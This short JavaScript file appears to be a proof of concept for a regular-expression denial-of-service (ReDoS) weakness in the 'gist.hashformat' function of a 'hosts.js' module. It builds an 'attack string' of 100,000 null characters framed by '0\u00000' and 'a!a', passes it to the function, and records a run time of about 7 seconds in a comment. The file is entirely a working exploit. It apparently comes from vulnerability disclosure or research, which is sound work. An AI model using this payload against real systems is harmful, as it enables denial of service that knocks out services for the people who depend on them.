const hosts = require("./hosts.js");

//Attack String :"0\u00000"+"\u0000"*100000+"a!a"
var str = "0\u00000";
for (var i = 0; i < 100000; i++) {
  str += "\u0000";
}
str += "a!a";

console.log(hosts.gist.hashformat(str));

// real    0m7.171s
// user    0m7.144s
// sys     0m0.010s